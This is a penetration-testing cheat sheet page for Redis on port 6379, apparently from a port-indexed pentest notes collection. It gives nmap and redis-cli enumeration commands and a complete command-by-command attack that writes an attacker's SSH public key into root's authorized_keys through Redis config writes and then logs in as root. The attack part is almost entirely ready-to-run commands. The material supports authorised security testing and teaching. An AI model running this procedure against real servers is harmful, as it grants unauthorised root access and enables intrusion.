---
title: 6379 - Redis
type: service
tab: Services
ports: [6379]
service: Redis
tools: [redis-cli, nmap, ssh-keygen, ssh]
inputs: [Password]
outputs: [Banner, Shell]
tags: [Redis, Enumeration, Exploitation, SSH, Linux]
---

# 6379 - Redis

`6379/tcp open redis`

## Found / Do / Then

- Found: `6379/tcp open redis`.
- Do: check whether Redis allows unauthenticated or password-authenticated `INFO`.
- Then: review config/write ability and consider SSH key injection only when Redis can write to a useful path.

## Commands

### Quick Checks

#Redis #Enumeration
Fingerprint Redis and check whether authentication is required.

```sh
nmap <TARGET_IP> -p 6379 -sV --script redis-info
redis-cli -h <TARGET_IP> -p 6379 INFO
```

### Authenticated Info

#Password #Redis #Enumeration
Query Redis when a password is known.

```sh
redis-cli -h <TARGET_IP> -p 6379 -a '<PASS>' INFO
```

### Redis SSH Key Injection

#Password #SSH #Exploitation #Linux
Write an SSH public key into root `authorized_keys` when Redis allows authenticated config writes.

1. Generate an SSH key and prepare the public key.

```sh
ssh-keygen -f ~/.ssh/id_rsa -P "" -t rsa
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
```

2. Write the key into Redis.

```sh
cat foo.txt | redis-cli -h <TARGET_IP> -p 6379 -a '<PASS>' -x set ssh_key
```

3. Configure Redis to save the key as `authorized_keys`.

```sh
redis-cli -h <TARGET_IP> -p 6379 -a '<PASS>'
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
save
exit
```

4. SSH as root with the generated private key.

```sh
ssh -i ~/.ssh/id_rsa root@<TARGET_IP>
```
